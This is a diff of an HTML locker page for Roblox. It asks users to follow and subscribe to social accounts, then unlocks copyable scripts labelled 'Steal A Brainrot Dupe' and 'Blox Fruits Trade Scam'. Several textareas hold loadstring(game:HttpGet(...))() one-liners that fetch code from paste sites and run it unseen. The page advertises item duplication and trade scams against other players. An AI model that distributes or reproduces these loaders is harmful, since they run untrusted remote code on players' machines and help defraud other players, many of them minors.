@@ -55,7 +55,6 @@ color:white
 .comment{background:#ec4899}
 .tiktok{background:#3b82f6}
 .switch{background:#64748b}
-
 .progress{
 background:#1e293b;
 border-radius:10px;
@@ -133,16 +132,15 @@ margin:12px 0
 
 <body>
 
-<!-- STEAL A BRAINROT -->
 <div class="card" id="brainrotPage">
 <div class="title"><span class="dev-btn" onclick="openDev('brainrot')">🔑</span> Steal A Brainrot Dupe</div>
 <div class="subtitle">Complete all steps to unlock</div>
 
-<button class="task watch" onclick="step('brainrot',this,'https://youtube.com/shorts/p8Tr6844hVg?si=gnI7QSns6yFMp92Y')">▶ Watch</button>
-<button class="task like" onclick="step('brainrot',this,'https://youtube.com/shorts/p8Tr6844hVg?si=gnI7QSns6yFMp92Y')">👍 Like</button>
-<button class="task youtube" onclick="step('brainrot',this,'https://youtube.com/@xxxvoid_scriptzxxx?si=pwr6gfnlW8ATxtd3')">🔔 Subscribe</button>
-<button class="task comment" onclick="step('brainrot',this,'https://youtu.be/Oc9vLLmABqs?si=_YUXH7qZ6aCfuRuU')">💬 Comment</button>
-<button class="task tiktok" onclick="step('brainrot',this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-939GHlXBjY6')">📌 Follow</button>
+<button class="task watch" onclick="step('brainrot',this,'https://youtube.com/shorts/p8Tr6844hVg')">▶ Watch</button>
+<button class="task like" onclick="step('brainrot',this,'https://youtube.com/shorts/p8Tr6844hVg')">👍 Like</button>
+<button class="task youtube" onclick="step('brainrot',this,'https://youtube.com/@xxxvoid_scriptzxxx')">🔔 Subscribe</button>
+<button class="task comment" onclick="step('brainrot',this,'https://youtu.be/Oc9vLLmABqs')">💬 Comment</button>
+<button class="task tiktok" onclick="step('brainrot',this,'https://www.tiktok.com/@void_scriptz')">📌 Follow</button>
 
 <div class="progress"><div class="bar" id="barBrainrot"></div></div>
 <div class="percent" id="percentBrainrot">0%</div>
@@ -165,23 +163,22 @@ margin:12px 0
 <button class="task switch" onclick="switchPage()">🍎 Blox Fruits Trade Scam</button>
 </div>
 
-<!-- BLOX FRUITS -->
 <div class="card" id="bloxPage" style="display:none">
 <div class="title"><span class="dev-btn" onclick="openDev('blox')">🍎</span> Blox Fruits Trade Scam</div>
 <div class="subtitle">Complete all steps to unlock</div>
 
-<button class="task tiktok" onclick="step('blox',this,'https://www.tiktok.com/@void_scriptz')">📌 Follow</button>
-<button class="task youtube" onclick="step('blox',this,'https://youtube.com/@xxxvoid_scriptzxxx')">🔔 Subscribe</button>
-<button class="task like" onclick="step('blox',this,'https://youtube.com/shorts/ycfxxkTQmTU')">👍 Like</button>
-<button class="task comment" onclick="step('blox',this,'https://youtube.com/shorts/ycfxxkTQmTU')">💬 Comment</button>
 <button class="task watch" onclick="step('blox',this,'https://youtube.com/shorts/ycfxxkTQmTU')">▶ Watch</button>
+<button class="task like" onclick="step('blox',this,'https://youtube.com/shorts/ycfxxkTQmTU')">👍 Like</button>
+<button class="task youtube" onclick="step('blox',this,'https://youtube.com/@xxxvoid_scriptzxxx')">🔔 Subscribe</button>
+<button class="task comment" onclick="step('blox',this,'https://youtube.com/shorts/ycfxxkTQmTU')">💬 Comment</button>
+<button class="task tiktok" onclick="step('blox',this,'https://www.tiktok.com/@void_scriptz')">📌 Follow</button>
 
 <div class="progress"><div class="bar" id="barBlox"></div></div>
 <div class="percent" id="percentBlox">0%</div>
 
 <div class="scripts" id="bloxScripts">
 <div class="script-box">
-<textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/Pb2ZphVIosYAmuSe/raw", true))()</textarea>
+<textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/YZ8jOG4OthFcWlNT/raw", true))()</textarea>
 <button class="copy" onclick="copy(this)">Copy</button>
 </div>
 </div>
@@ -189,17 +186,15 @@ margin:12px 0
 <button class="task switch" onclick="switchPage()">🔑 Steal A Brainrot Dupe</button>
 </div>
 
-<!-- DEV PANEL -->
 <div class="dev-panel" id="devPanel">
 <div class="dev-header">
 <span>DEV PANEL</span>
 <span class="close" onclick="devPanel.style.display='none'">✖</span>
 </div>
-
 <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
 <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
 <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
-<textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/Pb2ZphVIosYAmuSe/raw", true))()</textarea>
+<textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/YZ8jOG4OthFcWlNT/raw", true))()</textarea>
 </div>
 
 <div class="footer">Last updated: January 2026</div>
@@ -207,7 +202,6 @@ margin:12px 0
 <script>
 const total=5;
 let prog={brainrot:0,blox:0};
-
 function step(page,btn,link){
 if(btn.dataset.done)return;
 btn.dataset.done=1;
